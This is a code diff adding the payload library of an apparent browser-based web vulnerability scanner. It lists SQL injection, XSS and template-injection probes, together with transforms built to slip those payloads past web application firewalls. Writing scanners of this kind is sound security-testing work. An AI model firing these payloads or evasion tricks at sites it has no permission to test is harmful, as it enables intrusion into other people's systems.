@@ -1,0 +1,151 @@
+/* Aegis Lens payload library — ported from the aegis Python scanner,
+   plus UNION-based SQLi and SSTI probes. Loaded into the service worker
+   via importScripts. */
+"use strict";
+
+/* ------------------------------------------------------------------ */
+/* SQLi                                                                */
+/* ------------------------------------------------------------------ */
+
+const ERROR_PROBES = [
+  "'", '"', "')", '")', "'))",
+  "' OR '1'='1", '" OR "1"="1', "' OR 1=1-- -",
+];
+
+const BOOLEAN_PAIRS = [
+  ["' AND '1'='1", "' AND '1'='2"],
+  ["' AND 1=1-- -", "' AND 1=2-- -"],
+  ['" AND "1"="1', '" AND "1"="2'],
+  ["' AND 1=1#", "' AND 1=2#"],
+];
+
+// canary-based UNION confirmation: {cols, build(canary)}
+const UNION_PROBES = [
+  { cols: 1, build: (c) => `' UNION SELECT '${c}'-- -` },
+  { cols: 2, build: (c) => `' UNION SELECT '${c}','${c}2'-- -` },
+];
+
+// probes that get the evasion treatment on pass 2
+const EVADE_BASE = ["'", '"', "')"];
+
+const ERROR_SIGS = [
+  [/you have an error in your sql syntax/i, "MySQL"],
+  [/warning:\s*mysql/i, "MySQL"],
+  [/mysqli?_[a-z_]+\(\)/i, "MySQL"],
+  [/valid mysql result/i, "MySQL"],
+  [/mysql server version/i, "MySQL"],
+  [/mariadb server version/i, "MariaDB"],
+  [/pg_query\(\)|pg_exec\(\)/i, "PostgreSQL"],
+  [/unterminated quoted string/i, "PostgreSQL"],
+  [/postgresql.+error/i, "PostgreSQL"],
+  [/warning.+pg_/i, "PostgreSQL"],
+  [/unclosed quotation mark/i, "MSSQL"],
+  [/microsoft ole db provider for sql server/i, "MSSQL"],
+  [/odbc sql server driver/i, "MSSQL"],
+  [/ora-01756|ora-00933|quoted string not properly terminated/i, "Oracle"],
+  [/oracle error/i, "Oracle"],
+  [/sqlite3?::|sqlite error/i, "SQLite"],
+  [/near .+ syntax error/i, "SQLite"],
+  [/xpathexception|invalid xpath/i, "XPath"],
+  [/ldapexception|supplied argument is not a valid ldap/i, "LDAP"],
+  [/sql syntax/i, "Generic"],
+  [/database error/i, "Generic"],
+  [/db error/i, "Generic"],
+  [/syntax error.+query/i, "Generic"],
+];
+
+/* ---------------- WAF-evasion transforms (ported from aegis) -------- */
+
+const TRANSFORMS = {
+  randomcase: (p) => [...p].map((c) => (Math.random() < 0.5 ? c.toUpperCase() : c.toLowerCase())).join(""),
+  space2comment: (p) => p.replace(/ /g, "/**/"),
+  tabspace: (p) => p.replace(/ /g, "\t"),
+  newlinespace: (p) => p.replace(/ /g, "\n"),
+  charencode: (p) =>
+    [...p].map((c) => (/[a-zA-Z0-9]/.test(c) ? c : "%" + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, "0"))).join(""),
+  doubleencode: (p) => TRANSFORMS.charencode(p).replace(/%/g, "%25"),
+  "versioned-comments": (p) =>
+    p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => `/*!50000${m.toUpperCase()}*/`),
+  nullbyte: (p) => p + "%00",
+  "keyword-split": (p) => {
+    const pairs = [["UNION", "UN/**/ION"], ["SELECT", "SEL/**/ECT"], ["AND", "A/**/ND"], ["OR", "O/**/R"],
+                   ["FROM", "F/**/ROM"], ["WHERE", "W/**/HERE"], ["SLEEP", "SL/**/EEP"]];
+    let out = p;
+    for (const [kw, split] of pairs) out = out.replace(new RegExp(`\\b${kw}\\b`, "gi"), split);
+    return out;
+  },
+};
+
+const LEVEL_TRANSFORMS = {
+  1: [],
+  2: ["randomcase", "space2comment", "tabspace", "charencode"],
+  3: ["randomcase", "space2comment", "tabspace", "newlinespace", "charencode",
+      "doubleencode", "versioned-comments", "nullbyte", "keyword-split"],
+};
+
+/* encodeURIComponent that preserves intentional %XX sequences from transforms */
+function enc(v) {
+  return encodeURIComponent(v).replace(/%25([0-9A-Fa-f]{2})/g, "%$1");
+}
+
+/* ------------------------------------------------------------------ */
+/* XSS — full 22-probe catalogue from aegis                             */
+/* ------------------------------------------------------------------ */
+
+// {name, template ({C} = canary), kinds: subset of tag/js}
+const XSS_PROBES = [
+  { name: "html-script", t: "<script>{C}</script>", kinds: ["tag"] },
+  { name: "html-svg", t: "<svg onload={C}>", kinds: ["tag"] },
+  { name: "html-svg-quoted", t: '<svg onload="{C}">', kinds: ["tag"] },
+  { name: "html-img", t: "<img src=x onerror={C}>", kinds: ["tag"] },
+  { name: "html-details", t: "<details open ontoggle={C}>", kinds: ["tag"] },
+  { name: "html-body", t: "<body onload={C}>", kinds: ["tag"] },
+  { name: "html-iframe", t: '<iframe srcdoc="<svg onload={C}>">', kinds: ["tag"] },
+  { name: "html-video", t: "<video><source onerror={C}>", kinds: ["tag"] },
+  { name: "attr-dquote", t: '"><svg onload={C}>', kinds: ["tag"] },
+  { name: "attr-squote", t: "'><svg onload={C}>", kinds: ["tag"] },
+  { name: "attr-nospace", t: '"><svg/onload={C}>', kinds: ["tag"] },
+  { name: "js-squote", t: "';{C};//", kinds: ["js"] },
+  { name: "js-dquote", t: '";{C};//', kinds: ["js"] },
+  { name: "js-template", t: "${" + "{C}" + "}", kinds: ["js"] },
+  { name: "js-backtick", t: "`;{C};//", kinds: ["js"] },
+  { name: "script-close", t: "</script><svg onload={C}>", kinds: ["tag", "js"] },
+  { name: "evade-case", t: "<ScRiPt>{C}</ScRiPt>", kinds: ["tag"] },
+  { name: "evade-nested", t: "<scr<script>ipt>{C}</scr</script>ipt>", kinds: ["tag"] },
+  { name: "evade-nospace", t: "<svg/onload={C}>", kinds: ["tag"] },
+  { name: "evade-tab", t: "<svg\tonload={C}>", kinds: ["tag"] },
+  { name: "evade-entity", t: "&#x3c;svg onload={C}&#x3e;", kinds: ["tag"] },
+  { name: "evade-comment", t: "<!--><svg onload={C}>", kinds: ["tag"] },
+];
+
+const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 22 };
+
+/* ------------------------------------------------------------------ */
+/* SSTI — distinctive-math probes (detection only)                     */
+/* ------------------------------------------------------------------ */
+
+const SSTI_FACTOR_A = 1337, SSTI_FACTOR_B = 7331;
+const SSTI_EXPECTED = String(SSTI_FACTOR_A * SSTI_FACTOR_B); // 9801547
+const SSTI_PROBES = [
+  `{{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}}`,
+  `\${${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,
+];
+
+/* ------------------------------------------------------------------ */
+/* Scan planning (progress bar)                                         */
+/* ------------------------------------------------------------------ */
+
+function planCounts(nParams, opts, level) {
+  const lv = Math.min(Math.max(level || 1, 1), 3);
+  let per = 1; // baseline
+  if (opts.sqli) {
+    per += ERROR_PROBES.length + BOOLEAN_PAIRS.length * 2 + UNION_PROBES.length;
+    if (lv >= 2) per += EVADE_BASE.length * LEVEL_TRANSFORMS[lv].length;
+  }
+  if (opts.xss) per += XSS_PROBES.slice(0, XSS_LEVEL_CUTOFF[lv]).length;
+  if (opts.ssti) per += SSTI_PROBES.length;
+  let total = nParams * per;
+  if (opts.headers || opts.cve) total += 1; // shared page fetch
+  if (opts.cve) total += 5; // exposed-path probes
+  return total;
+}
